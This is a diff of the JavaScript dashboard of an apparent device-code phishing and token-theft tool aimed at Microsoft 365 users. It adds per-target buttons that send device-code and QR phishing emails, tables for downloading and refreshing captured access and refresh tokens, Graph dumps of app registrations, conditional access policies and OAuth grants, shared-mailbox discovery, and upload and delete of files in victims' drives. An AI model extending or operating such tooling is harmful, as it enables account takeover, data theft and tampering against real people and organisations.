     body.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:32px;color:var(--text-dim)">No emails sent yet</td></tr>';
+    document.getElementById('emailResultsPager').innerHTML = '';
     return;
   }
-  body.innerHTML = results.map(r => `
+  body.innerHTML = items.map(r => `
     <tr>
-      <td style="color:var(--text-bright)">${r.target_email}</td>
+      <td style="color:var(--text-bright)">${escH(r.target_email)}</td>
       <td>${r.success ? '<span class="badge badge-ok">✓ sent</span>' : '<span class="badge badge-fail">✕ failed</span>'}</td>
       <td style="color:var(--text-dim);font-size:11px">${formatTime(r.sent_at)}</td>
-      <td style="color:var(--accent2);font-size:11px">${r.error || '—'}</td>
+      <td style="color:var(--accent2);font-size:11px">${escH(r.error || '—')}</td>
     </tr>
   `).join('');
+  renderPager('emailResultsPager', page, totalPages, total, 'emailResultsPrev', 'emailResultsNext');
 }
+function emailResultsPrev() { emailResultsSetPage(emailResultsPage - 1); }
+function emailResultsNext() { emailResultsSetPage(emailResultsPage + 1); }
 
 async function exportCampaign() {
   if (!activeCampaignID) { notify('Select a campaign first', true); return; }
@@ -1329,35 +1831,63 @@ function updateDashboard(data) {
   document.getElementById('statPending').textContent = pending;
   document.getElementById('statCaptured').textContent = captured;
   document.getElementById('statExpired').textContent = expired;
+
+  // Keep the sidebar campaign status badge in sync with live SSE data.
+  // When QR scan triggers Launch server-side, the sidebar badge updates
+  // from "draft" to "running" without requiring a full page refresh.
+  if (data.status && activeCampaignID) {
+    const listEl = document.getElementById('campaignList');
+    if (listEl) {
+      const row = listEl.querySelector(`[data-camp-id="${CSS.escape(activeCampaignID)}"] .camp-status`);
+      if (row) row.textContent = data.status;
+    }
+  }
+
   renderSessions(sessArr);
   renderNewTokens(sessArr.filter(s => s.state_str === 'completed'));
 }
 
 function renderSessions(sessions) {
-  const body = document.getElementById('sessionsBody');
-  if (!sessions.length) {
-    body.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:32px;color:var(--text-dim)">No active sessions — launch campaign to start</td></tr>';
-    return;
-  }
-  sessions.sort((a, b) => {
+  sessionsAll = sessions.slice().sort((a, b) => {
     const order = {completed:0, pending:1, expired:2, error:3, cancelled:4, initializing:5};
     return (order[a.state_str]||9) - (order[b.state_str]||9);
   });
-  body.innerHTML = sessions.map(s => {
+  sessionsRenderPage(sessionsPage);
+}
+
+function sessionsRenderPage(p) {
+  sessionsPage = p;
+  const body = document.getElementById('sessionsBody');
+  if (!sessionsAll.length) {
+    body.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:32px;color:var(--text-dim)">No active sessions — launch campaign to start</td></tr>';
+    document.getElementById('sessionsPager').innerHTML = '';
+    return;
+  }
+  const { items, page, totalPages, total } = paginate(sessionsAll, p);
+  body.innerHTML = items.map(s => {
     const expiry = s.expires_at ? timeUntil(s.expires_at) : '—';
     const codeClass = s.state_str === 'completed' ? 'user-code redeemed' : 'user-code';
-    return `
-      <tr>
-        <td style="color:var(--text-bright)">${s.target_email}</td>
-        <td><span class="${codeClass}">${s.user_code || '—'}</span></td>
-        <td>${badgeHTML(s.state_str)}</td>
-        <td style="color:var(--text-dim)">${s.poll_count || 0}</td>
-        <td style="color:${s.state_str==='expired'?'var(--accent2)':'var(--text-dim)'}">${expiry}</td>
-        <td style="color:var(--accent3)">${s.upn || '—'}</td>
-      </tr>
-    `;
+    const canSend = s.state_str === 'pending' || s.state_str === 'initializing';
+    const sendBtn = canSend
+      ? `<button class="btn btn-sm btn-warn" style="padding:3px 8px;margin-bottom:0" title="Send DC email to this target" onclick="sendEmailToSession('${escH(s.target_id)}','${escH(s.target_email)}',this)">✉</button>`
+      : '';
+    const qrBtn = canSend
+      ? `<button class="btn btn-sm" style="padding:3px 8px;margin-bottom:0;background:var(--bg3);border-color:var(--accent);color:var(--accent)" title="Send QR phishing email to this target" onclick="sendQREmails('${escH(s.target_id)}','${escH(s.target_email)}',this)">⬛</button>`
+      : '';
+    return `<tr>
+      <td style="color:var(--text-bright)">${escH(s.target_email)}</td>
+      <td><span class="${codeClass}">${escH(s.user_code || '—')}</span></td>
+      <td>${badgeHTML(s.state_str)}</td>
+      <td style="color:var(--text-dim)">${s.poll_count || 0}</td>
+      <td style="color:${s.state_str==='expired'?'var(--accent2)':'var(--text-dim)'}">${expiry}</td>
+      <td style="color:var(--accent3)">${escH(s.upn || '—')}</td>
+      <td style="text-align:right;display:flex;gap:4px;justify-content:flex-end">${sendBtn}${qrBtn}</td>
+    </tr>`;
   }).join('');
+  renderPager('sessionsPager', page, totalPages, total, 'sessionsPrev', 'sessionsNext');
 }
+function sessionsPrev() { sessionsRenderPage(sessionsPage - 1); }
+function sessionsNext() { sessionsRenderPage(sessionsPage + 1); }
 
 function renderNewTokens(completed) {
   const log = document.getElementById('tokenLog');
@@ -1387,40 +1917,24 @@ async function loadTokenLog() {
   const tokens = await api('GET', '/campaigns/' + activeCampaignID + '/tokens');
   if (!Array.isArray(tokens) || tokens.length === 0) return;
 
-  // Populate tokens table with action buttons
-  const tbody = document.getElementById('tokensBody');
-  tbody.innerHTML = tokens.map(t => {
-    const identity = t.upn || t.target_email;
-    const tid = encodeURIComponent(t.target_id);
-    const cid = activeCampaignID;
-    return `
-      <tr>
-        <td style="color:var(--text-bright)">${t.target_email}</td>
-        <td style="color:var(--accent3)">${identity}</td>
-        <td style="color:var(--text-dim);font-size:11px">${formatTime(t.redeemed_at)}</td>
-        <td style="color:var(--text-dim);font-size:10px;max-width:160px;overflow:hidden;text-overflow:ellipsis">${t.scope || '—'}</td>
-        <td>
-          <div style="display:flex;gap:4px;flex-wrap:wrap">
-            <button class="btn btn-sm" title="Download Access Token" onclick="dlToken('${cid}','${tid}','access-token','at_${t.target_email}.txt')">↓ AT</button>
-            <button class="btn btn-sm" title="Download Refresh Token" onclick="dlToken('${cid}','${tid}','refresh-token','rt_${t.target_email}.txt')">↓ RT</button>
-            <button class="btn btn-sm btn-primary" title="Refresh access token using refresh token" onclick="refreshUserToken('${cid}','${tid}','${t.target_email}',this)">↺ Refresh</button>
-          </div>
-        </td>
-      </tr>
-    `;
-  }).join('');
+  tokensAll = tokens;
+  tokensSetPage(tokensPage);
 
-  // Also populate graph target dropdown
-  const sel = document.getElementById('graphTargetSelect');
-  const prev = sel.value;
-  while (sel.options.length > 1) sel.remove(1);
-  tokens.forEach(t => {
-    const opt = document.createElement('option');
-    opt.value = t.target_id;
-    opt.textContent = (t.upn || t.target_email);
-    sel.appendChild(opt);
+  // Populate all target dropdowns
+  const selectors = ['graphTargetSelect','mailTargetSelect','teamsTargetSelect','filesTargetSelect','usersTargetSelect'];
+  selectors.forEach(selId => {
+    const sel = document.getElementById(selId);
+    if (!sel) return;
+    const prev = sel.value;
+    while (sel.options.length > 1) sel.remove(1);
+    tokens.forEach(t => {
+      const opt = document.createElement('option');
+      opt.value = t.target_id;
+      opt.textContent = (t.upn || t.target_email);
+      sel.appendChild(opt);
+    });
+    if (prev) sel.value = prev;
   });
-  if (prev) sel.value = prev;
 
   // Append new entries to live log
   const log = document.getElementById('tokenLog');
@@ -1441,6 +1955,35 @@ async function loadTokenLog() {
     log.insertBefore(entry, log.firstChild);
   });
 }
+
+function tokensSetPage(p) {
+  tokensPage = p;
+  const { items, page, totalPages, total } = paginate(tokensAll, p);
+  const tbody = document.getElementById('tokensBody');
+  if (items.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:32px;color:var(--text-dim)">Waiting for tokens...</td></tr>';
+    return;
+  }
+  const cid = activeCampaignID;
+  tbody.innerHTML = items.map(t => {
+    const identity = escH(t.upn || t.target_email);
+    const tid = encodeURIComponent(t.target_id);
+    return `<tr>
+      <td style="color:var(--text-bright)">${escH(t.target_email)}</td>
+      <td style="color:var(--accent3)">${identity}</td>
+      <td style="color:var(--text-dim);font-size:11px">${formatTime(t.redeemed_at)}</td>
+      <td style="color:var(--text-dim);font-size:10px;max-width:140px;overflow:hidden;text-overflow:ellipsis">${escH((t.scope||'').split(' ').slice(0,3).join(' '))}</td>
+      <td><div style="display:flex;gap:4px;flex-wrap:wrap">
+        <button class="btn btn-sm" onclick="dlToken('${cid}','${tid}','access-token','')">↓ AT</button>
+        <button class="btn btn-sm" onclick="dlToken('${cid}','${tid}','refresh-token','')">↓ RT</button>
+        <button class="btn btn-sm btn-primary" onclick="refreshUserToken('${cid}','${tid}','${escH(t.target_email)}',this)">↺ Refresh</button>
+      </div></td>
+    </tr>`;
+  }).join('');
+  renderPager('tokensPager', page, totalPages, total, 'tokensPrev', 'tokensNext');
+}
+function tokensPrev() { tokensSetPage(tokensPage - 1); }
+function tokensNext() { tokensSetPage(tokensPage + 1); }
 
 function dlToken(campaignID, targetID, tokenType, filename) {
   const a = document.createElement('a');
@@ -1465,250 +2008,22 @@ async function refreshUserToken(campaignID, targetID, email, btn) {
   loadTokenLog();
 }
 
-// ─── Sender profiles ─────────────────────────────────────────────────────────
-function newProfileForm() {
-  editingProfileID = null;
-  document.getElementById('profName').value = '';
-  document.getElementById('profHost').value = '';
-  document.getElementById('profPort').value = '587';
-  document.getElementById('profUser').value = '';
-  document.getElementById('profPass').value = '';
-  document.getElementById('profFromName').value = '';
-  document.getElementById('profFromAddr').value = '';
-  document.getElementById('profImplicitTLS').checked = false;
-}
-
-async function loadProfiles() {
-  const profiles = await api('GET', '/mailer/profiles');
-  const sel = document.getElementById('selectedProfile');
-  const list = document.getElementById('profileList');
-  const prev = sel.value;
-
-  // Update sidebar dropdown
-  while (sel.options.length > 1) sel.remove(1);
-  if (Array.isArray(profiles)) {
-    profiles.forEach(p => {
-      const opt = document.createElement('option');
-      opt.value = p.id;
-      opt.textContent = p.name;
-      sel.appendChild(opt);
-    });
-    if (prev) sel.value = prev;
-  }
-
-  // Update config list
-  if (!Array.isArray(profiles) || profiles.length === 0) {
-    list.innerHTML = '<div style="color:var(--text-dim);font-size:11px">No profiles yet</div>';
-    return;
-  }
-  list.innerHTML = profiles.map(p => `
-    <div class="item-row" onclick="editProfile('${p.id}')">
-      <div>
-        <div class="item-row-name">${p.name}</div>
-        <div class="item-row-sub">${p.from_address} via ${p.host}:${p.port}</div>
-      </div>
-      <div class="item-row-actions">
-        <button class="btn btn-sm btn-danger" onclick="event.stopPropagation();deleteProfile('${p.id}')">✕</button>
-      </div>
-    </div>
-  `).join('');
-}
-
-function editProfile(id) {
-  api('GET', '/mailer/profiles').then(profiles => {
-    const p = profiles.find(x => x.id === id);
-    if (!p) return;
-    editingProfileID = id;
-    document.getElementById('profName').value = p.name || '';
-    document.getElementById('profHost').value = p.host || '';
-    document.getElementById('profPort').value = p.port || 587;
-    document.getElementById('profUser').value = p.username || '';
-    document.getElementById('profPass').value = '';
-    document.getElementById('profFromName').value = p.from_name || '';
-    document.getElementById('profFromAddr').value = p.from_address || '';
-    document.getElementById('profImplicitTLS').checked = p.implicit_tls || false;
-  });
-}
-
-async function saveProfile() {
-  const body = {
-    name: document.getElementById('profName').value.trim(),
-    host: document.getElementById('profHost').value.trim(),
-    port: parseInt(document.getElementById('profPort').value) || 587,
-    username: document.getElementById('profUser').value.trim(),
-    password: document.getElementById('profPass').value,
-    from_name: document.getElementById('profFromName').value.trim(),
-    from_address: document.getElementById('profFromAddr').value.trim(),
-    implicit_tls: document.getElementById('profImplicitTLS').checked,
-  };
-  if (!body.name || !body.host || !body.from_address) {
-    notify('Name, host, and from address required', true);
-    return;
-  }
-  const result = await api('POST', '/mailer/profiles', body);
-  if (result.error) { notify(result.error, true); return; }
-  notify('Sender profile saved');
-  newProfileForm();
-  loadProfiles();
-}
-
-async function deleteProfile(id) {
-  await api('DELETE', '/mailer/profiles/' + id);
-  notify('Profile deleted');
-  loadProfiles();
-}
-
-async function testProfile() {
-  const profID = editingProfileID;
-  if (!profID) {
-    notify('Save the profile first, then test it', true);
-    return;
-  }
-  const to = prompt('Send test email to:');
-  if (!to) return;
-  const result = await api('POST', '/mailer/profiles/' + profID + '/test', { to });
-  if (result.error) { notify('Test failed: ' + result.error, true); return; }
-  notify('Test email sent to ' + to);
-}
-
-// ─── Email templates ──────────────────────────────────────────────────────────
-function newTemplateForm() {
-  editingTemplateID = null;
-  document.getElementById('tmplName').value = '';
-  document.getElementById('tmplSubject').value = '';
-  document.getElementById('tmplRedirector').value = '';
-  document.getElementById('tmplHTML').value = '';
-  document.getElementById('tmplText').value = '';
-}
-
-async function loadTemplates() {
-  const templates = await api('GET', '/mailer/templates');
-  const sel = document.getElementById('selectedTemplate');
-  const list = document.getElementById('templateList');
-  const prev = sel.value;
-
-  while (sel.options.length > 1) sel.remove(1);
-  if (Array.isArray(templates)) {
-    templates.forEach(t => {
-      const opt = document.createElement('option');
-      opt.value = t.id;
-      opt.textContent = t.name;
-      sel.appendChild(opt);
-    });
-    if (prev) sel.value = prev;
-  }
-
-  if (!Array.isArray(templates) || templates.length === 0) {
-    list.innerHTML = '<div style="color:var(--text-dim);font-size:11px">No templates yet</div>';
-    return;
-  }
-  list.innerHTML = templates.map(t => `
-    <div class="item-row" onclick="editTemplate('${t.id}')">
-      <div>
-        <div class="item-row-name">${t.name}</div>
-        <div class="item-row-sub">${t.subject}</div>
-      </div>
-      <div class="item-row-actions">
-        <button class="btn btn-sm btn-danger" onclick="event.stopPropagation();deleteTemplate('${t.id}')">✕</button>
-      </div>
-    </div>
-  `).join('');
-}
-
-function editTemplate(id) {
-  api('GET', '/mailer/templates').then(templates => {
-    const t = templates.find(x => x.id === id);
-    if (!t) return;
-    editingTemplateID = id;
-    document.getElementById('tmplName').value = t.name || '';
-    document.getElementById('tmplSubject').value = t.subject || '';
-    document.getElementById('tmplRedirector').value = t.redirector_url || '';
-    document.getElementById('tmplHTML').value = t.html_body || '';
-    document.getElementById('tmplText').value = t.text_body || '';
-  });
-}
-
-async function saveTemplate() {
-  const body = {
-    name: document.getElementById('tmplName').value.trim(),
-    subject: document.getElementById('tmplSubject').value.trim(),
-    redirector_url: document.getElementById('tmplRedirector').value.trim(),
-    html_body: document.getElementById('tmplHTML').value,
-    text_body: document.getElementById('tmplText').value,
-  };
-  if (!body.name || !body.subject || !body.html_body) {
-    notify('Name, subject, and HTML body required', true);
-    return;
-  }
-
-  let result;
-  if (editingTemplateID) {
-    result = await api('PUT', '/mailer/templates/' + editingTemplateID, body);
-  } else {
-    result = await api('POST', '/mailer/templates', body);
-  }
-  if (result.error) { notify(result.error, true); return; }
-  notify('Template saved');
-  editingTemplateID = result.id || editingTemplateID;
-  loadTemplates();
-}
-
-async function deleteTemplate(id) {
-  await api('DELETE', '/mailer/templates/' + id);
-  if (editingTemplateID === id) newTemplateForm();
-  notify('Template deleted');
-  loadTemplates();
-}
-
-function uploadHTMLTemplate(input) {
-  const file = input.files[0];
-  if (!file) return;
-  const reader = new FileReader();
-  reader.onload = (e) => {
-    document.getElementById('tmplHTML').value = e.target.result;
-    notify('HTML template loaded — fill in name and subject then save');
-  };
-  reader.readAsText(file);
-  input.value = '';
-}
-
-function insertVar(fieldId, text) {
-  const el = document.getElementById(fieldId);
-  const start = el.selectionStart;
-  const end = el.selectionEnd;
-  el.value = el.value.substring(0, start) + text + el.value.substring(end);
-  el.selectionStart = el.selectionEnd = start + text.length;
-  el.focus();
-}
-
-function previewTemplate() {
-  const html = document.getElementById('tmplHTML').value;
-  if (!html) { notify('No HTML body to preview', true); return; }
-  // Render with sample data
-  const preview = html
-    .replace(/\{\{DCODE\}\}/g, 'ABCD-EFGH')
-    .replace(/\{\{URL\}\}/g, 'https://microsoft.com/devicelogin')
-    .replace(/\{\{EMAIL\}\}/g, 'user@corp.com')
-    .replace(/\{\{NAME\}\}/g, 'John Smith');
-  const modal = document.getElementById('previewModal');
-  const frame = document.getElementById('previewFrame');
-  frame.srcdoc = preview;
-  modal.style.display = 'flex';
-}
-
-function closePreview() {
-  document.getElementById('previewModal').style.display = 'none';
-}
-
 // ─── Tab switching ────────────────────────────────────────────────────────────
 function switchTab(name, btn) {
   document.querySelectorAll('#campaignView .tab').forEach(t => t.classList.remove('active'));
   document.querySelectorAll('#campaignView .tab-content').forEach(t => t.classList.remove('active'));
   btn.classList.add('active');
   document.getElementById('tab-' + name).classList.add('active');
-  if (name === 'tokens') loadTokenLog();
-  if (name === 'graph') loadTokenLog(); // populates target dropdown
-  if (name === 'emails') loadEmailResults();
+  if (name === 'tokens')  loadTokenLog();
+  if (name === 'graph')   loadTokenLog();
+  if (name === 'mail')    { loadTokenLog(); }
+  if (name === 'teams')   { loadTokenLog(); }
+  if (name === 'files')   { loadTokenLog(); }
+  if (name === 'users')   { loadTokenLog(); }
+  if (name === 'emails')   loadEmailResults();
+  if (name === 'targets')  targetsSetPage(1);
+  if (name === 'sessions') { sessionsPage = 1; sessionsRenderPage(1); }
+  if (name === 'qrscans') loadQRScans();
 }
 
 // ─── Graph Ops ────────────────────────────────────────────────────────────────
@@ -1975,20 +2290,29 @@ function renderDriveListing(data, targetID) {
     const dlBtn = !isFolder
       ? `<button class="btn btn-sm" style="padding:2px 8px" onclick="driveDownload('${cid}','${escH(targetID)}','${escH(item.id)}','${escH(item.name)}')">↓</button>`
       : `<button class="btn btn-sm" style="padding:2px 8px;opacity:0.4" title="Folder download not supported" disabled>↓</button>`;
+    const delBtn = !isFolder
+      ? `<button class="btn btn-sm btn-danger" style="padding:2px 8px;margin-left:2px" onclick="driveDeleteItem('${cid}','${escH(targetID)}','${escH(item.id)}','${escH(item.name)}')">🗑</button>`
+      : '';
 
     return `<tr>
       <td style="width:24px;text-align:center">${isFolder ? '📁' : fileIcon(item.name)}</td>
       <td>${nameCell.replace(icon+' ','')}</td>
       <td style="color:var(--text-dim);font-size:11px;white-space:nowrap">${size}</td>
       <td style="color:var(--text-dim);font-size:11px;white-space:nowrap">${modified}</td>
-      <td style="white-space:nowrap">${dlBtn}
+      <td style="white-space:nowrap">${dlBtn}${delBtn}
         ${item.webUrl ? `<a href="${escH(item.webUrl)}" target="_blank" class="btn btn-sm" style="padding:2px 8px;margin-left:2px">↗</a>` : ''}
       </td>
     </tr>`;
   }).join('');
 
+  const curFolderID = driveStack.length > 0 ? driveStack[driveStack.length-1].id : 'root';
+  const uploadBtn = `<label class="btn btn-sm btn-success" style="cursor:pointer;margin-bottom:0">
+    ↑ Upload <input type="file" style="display:none" onchange="driveUploadFile(this,'${cid}','${escH(targetID)}','${escH(curFolderID)}')"></label>`;
+
   return `
-    <div style="margin-bottom:10px;font-size:12px">${crumbs}</div>
+    <div style="margin-bottom:10px;font-size:12px;display:flex;justify-content:space-between;align-items:center">
+      <span>${crumbs}</span>${uploadBtn}
+    </div>
     <div class="table-wrap">
       <table class="data-table">
         <thead><tr><th style="width:24px"></th><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
@@ -2057,40 +2381,71 @@ async function graphSearch(type) {
   } catch(e) { graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`); }
 }
 
-async function graphCloneGroup() {
+// ─── Graph dump sections (App Registrations / Conditional Access / OAuth2 Grants) ──
+const graphDumpResults = {};
+
+async function graphDump(op) {
   const targetID = document.getElementById('graphTargetSelect').value;
   if (!targetID || !activeCampaignID) { notify('Select a captured target first', true); return; }
-  const sourceGroupID  = document.getElementById('graphCloneSrc').value.trim();
-  const newDisplayName = document.getElementById('graphCloneName').value.trim();
-  if (!sourceGroupID || !newDisplayName) { notify('Source group ID and new name required', true); return; }
-  graphLoading('clone-group');
+
+  const outputMap = { apps: 'graphAppsOutput', 'conditional-access': 'graphCaOutput', grants: 'graphGrantsOutput' };
+  const dlBtnMap  = { apps: 'graphAppsDlBtn', 'conditional-access': 'graphCaDlBtn', grants: 'graphGrantsDlBtn' };
+  const out = document.getElementById(outputMap[op]);
+  const dlBtn = document.getElementById(dlBtnMap[op]);
+  out.style.display = 'block';
+  out.textContent = 'Loading...';
+  out.style.color = 'var(--text-dim)';
+
   try {
-    const r = await fetch('/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/clone-group', {
-      method: 'POST', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ source_group_id: sourceGroupID, new_display_name: newDisplayName })
-    });
+    const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/' + op);
     const json = await r.json();
-    graphFinish('clone-group', json);
-    if (!json.error) notify('Group cloned: ' + newDisplayName);
-  } catch(e) { graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`); }
+    if (json.error) {
+      out.textContent = '⚠ ' + json.error;
+      out.style.color = 'var(--accent2)';
+      return;
+    }
+    graphDumpResults[op] = json;
+    out.textContent = JSON.stringify(json, null, 2);
+    out.style.color = 'var(--text)';
+    if (dlBtn) dlBtn.style.display = 'inline-flex';
+  } catch(e) {
+    out.textContent = '⚠ ' + e.message;
+    out.style.color = 'var(--accent2)';
+  }
 }
 
-async function graphDeployApp() {
-  const targetID = document.getElementById('graphTargetSelect').value;
+function graphDumpDownload(op) {
+  const data = graphDumpResults[op];
+  if (!data) { notify('No data to download', true); return; }
+  const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'graph_' + op + '_' + Date.now() + '.json';
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+// discoverMailboxes — runs from the Mail tab
+async function discoverMailboxes() {
+  const targetID = document.getElementById('mailTargetSelect').value;
   if (!targetID || !activeCampaignID) { notify('Select a captured target first', true); return; }
-  const displayName = document.getElementById('graphAppName').value.trim();
-  const redirectURI = document.getElementById('graphAppRedirect').value.trim();
-  if (!displayName) { notify('App display name required', true); return; }
-  graphLoading('deploy-app');
+  notify('Discovering shared mailboxes...');
   try {
-    const r = await fetch('/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/deploy-app', {
-      method: 'POST', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ display_name: displayName, redirect_uri: redirectURI })
-    });
+    const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/mailboxes');
     const json = await r.json();
-    graphFinish('deploy-app', json);
-    if (!json.error) notify('App deployed: ' + displayName);
-  } catch(e) { graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`); }
+    if (json.error) { notify('Mailbox discovery failed: ' + json.error, true); return; }
+    const mailboxes = json.value || json || [];
+    if (!mailboxes.length) { notify('No shared mailboxes found'); return; }
+    // Show as a modal-like notification or append to mail folder list
+    const list = document.getElementById('mailFolderList');
+    const section = document.createElement('div');
+    section.style.cssText = 'padding:8px 14px;border-top:1px solid var(--border)';
+    section.innerHTML = `<div style="font-size:9px;letter-spacing:0.2em;text-transform:uppercase;color:var(--warn);margin-bottom:6px">Shared Mailboxes (${mailboxes.length})</div>` +
+      mailboxes.map(m => `<div style="padding:4px 0;font-size:11px;color:var(--accent);cursor:pointer;border-bottom:1px solid var(--border)" onclick="openSharedMailbox('${escH(m.id||m.mail||'')}','${escH(m.displayName||m.mail||'')}')">${escH(m.displayName||m.mail||m.id)}</div>`).join('');
+    list.appendChild(section);
+    notify('Found ' + mailboxes.length + ' shared mailbox(es)');
+  } catch(e) { notify('Error: ' + e.message, true); }
 }
 
 function graphDownloadResult() {
@@ -2104,12 +2459,6 @@ function graphDownloadResult() {
   URL.revokeObjectURL(url);
 }
 
-function switchMailTab(name, btn) {
-  document.querySelectorAll('#mailConfigView .tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('#mailConfigView .tab-content').forEach(t => t.classList.remove('active'));
-  btn.classList.add('active');
-  document.getElementById('mailtab-' + name).classList.add('active');
-}
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
 function badgeHTML(state) {
@@ -2139,123 +2488,34 @@ function formatTime(isoDate) {
   return new Date(isoDate).toLocaleTimeString();
 }
 
-// ─── Webhook Listener ─────────────────────────────────────────────────────────
-let webhookPollTimer = null;
-
-function showWebhookView() {
-  showView('webhook');
-  webhookRefreshStatus();
-  webhookRefreshLogs();
-  webhookPollTimer = setInterval(() => {
-    webhookRefreshStatus();
-    webhookRefreshLogs();
-  }, 5000);
-}
-
-async function webhookRefreshStatus() {
-  const r = await fetch('/api/webhook/status');
-  if (!r.ok) return;
-  const s = await r.json();
-  const dot = document.getElementById('webhookDot');
-  const label = document.getElementById('webhookStatusLabel');
-  const startBtn = document.getElementById('webhookStartBtn');
-  const stopBtn = document.getElementById('webhookStopBtn');
-  const endpoint = document.getElementById('webhookEndpoint');
-  document.getElementById('webhookTotal').textContent = s.entries;
-  if (s.running) {
-    dot.style.background = 'var(--accent3)';
-    dot.style.boxShadow = '0 0 8px var(--accent3)';
-    label.style.color = 'var(--accent3)';
-    label.textContent = `RUNNING — port ${s.port}`;
-    startBtn.disabled = true;
-    stopBtn.disabled = false;
-    endpoint.textContent = `POST :<span style="color:var(--warn)">${s.port}</span>/receive`;
-    endpoint.innerHTML = `POST :<span style="color:var(--warn)">${s.port}</span>/receive`;
-  } else {
-    dot.style.background = 'var(--text-dim)';
-    dot.style.boxShadow = 'none';
-    label.style.color = 'var(--text-dim)';
-    label.textContent = 'STOPPED';
-    startBtn.disabled = false;
-    stopBtn.disabled = true;
-    endpoint.textContent = '—';
-  }
-}
-
-async function webhookStart() {
-  const port = parseInt(document.getElementById('webhookPort').value, 10);
-  if (!port || port < 1 || port > 65535) { notify('Invalid port', true); return; }
-  const r = await fetch('/api/webhook/start', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({port})
-  });
-  const data = await r.json();
-  if (data.error) { notify(data.error, true); return; }
-  notify(`Listener started on port ${port}`);
-  webhookRefreshStatus();
-}
-
-async function webhookStop() {
-  const r = await fetch('/api/webhook/stop', {method: 'POST', headers: {'Content-Type': 'application/json'}});
-  const data = await r.json();
-  if (data.error) { notify(data.error, true); return; }
-  notify('Listener stopped');
-  webhookRefreshStatus();
-}
-
-async function webhookRefreshLogs() {
-  const r = await fetch('/api/webhook/logs');
-  if (!r.ok) return;
-  const data = await r.json();
-  const entries = data.entries || [];
-  document.getElementById('webhookEntryCount').textContent = `(${entries.length})`;
-  document.getElementById('webhookLastRefresh').textContent =
-    'Last refresh: ' + new Date().toLocaleTimeString();
-
-  const log = document.getElementById('webhookLog');
-  if (entries.length === 0) {
-    log.innerHTML = '<div style="padding:24px;text-align:center;color:var(--text-dim)" id="webhookEmpty">No entries yet. Start the listener and send a POST to /receive.</div>';
-    return;
-  }
-
-  const rows = [...entries].reverse().map(e => {
-    let payloadDisplay;
-    try {
-      payloadDisplay = JSON.stringify(JSON.parse(e.payload), null, 2);
-    } catch {
-      payloadDisplay = e.payload;
-    }
-    return `<div style="border-bottom:1px solid var(--border);padding:10px 14px">
-      <div style="display:flex;gap:16px;margin-bottom:4px;flex-wrap:wrap">
-        <span style="color:var(--accent);font-size:10px">${e.timestamp || '—'}</span>
-        <span style="color:var(--warn);font-size:10px">src: ${e.source || '—'}</span>
-      </div>
-      <pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:11px;color:var(--text);line-height:1.5">${escapeHTML(payloadDisplay)}</pre>
-    </div>`;
-  }).join('');
-  log.innerHTML = rows;
-}
-
-function webhookClearView() {
-  document.getElementById('webhookLog').innerHTML =
-    '<div style="padding:24px;text-align:center;color:var(--text-dim)">View cleared. Entries still saved to log file.</div>';
-  document.getElementById('webhookEntryCount').textContent = '(0)';
-}
-
-function escapeHTML(str) {
-  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-}
-
 // ─── Boot ─────────────────────────────────────────────────────────────────────
-(async () => {
+async function loadMailerSelects() {
+  const [profilesRes, templatesRes] = await Promise.all([
+    api('GET', '/mailer/profiles').catch(() => []),
+    api('GET', '/mailer/templates').catch(() => []),
+  ]);
+  const profiles = Array.isArray(profilesRes) ? profilesRes : [];
+  const templates = Array.isArray(templatesRes) ? templatesRes : [];
+  const profOpts = '<option value="">— no profile —</option>' +
+    profiles.map(p => `<option value="${escH(p.id)}">${escH(p.name)} &lt;${escH(p.from_address)}&gt;</option>`).join('');
+  const tmplOpts = '<option value="">— no template —</option>' +
+    templates.map(t => `<option value="${escH(t.id)}">${escH(t.name)}</option>`).join('');
+  document.getElementById('selectedProfile').innerHTML = profOpts;
+  document.getElementById('selectedTemplate').innerHTML = tmplOpts;
+  document.getElementById('qrTemplate').innerHTML = tmplOpts;
+  document.getElementById('qrDcTemplate').innerHTML = tmplOpts;
+}
+
+async function bootApp() {
   const camps = await api('GET', '/campaigns').catch(() => []);
   if (Array.isArray(camps) && camps.length > 0) {
     renderCampaignList(camps);
+    // Auto-select only campaign if exactly one
+    if (camps.length === 1) selectCampaign(camps[0].id);
   }
-  loadProfiles();
-  loadTemplates();
-})();
+  loadMailerSelects();
+}
+bootApp();
 
 // ─── Drag-drop CSV ────────────────────────────────────────────────────────────
 const uploadArea = document.getElementById('uploadArea');
@@ -2273,6 +2533,853 @@ uploadArea.addEventListener('drop', (e) => {
     importCSV(input);
   }
 });
+
+// ─── Drive: upload + delete helper ───────────────────────────────────────────
+async function driveUploadFile(input, campaignID, targetID, folderItemID) {
+  const file = input.files[0];
+  if (!file) return;
+  const form = new FormData();
+  form.append('file', file);
+  input.value = '';
+  notify('Uploading: ' + file.name + '...');
+  const url = '/api/campaigns/' + campaignID + '/graph/' + encodeURIComponent(targetID)
+    + '/drive/upload?folder=' + encodeURIComponent(folderItemID === 'root' ? '' : folderItemID);
+  try {
+    const r = await fetch(url, {method: 'POST', body: form});
+    if (r.status === 401) { showLoginOverlay(); return; }
+    const data = await r.json();
+    if (data.error) { notify('Upload failed: ' + data.error, true); return; }
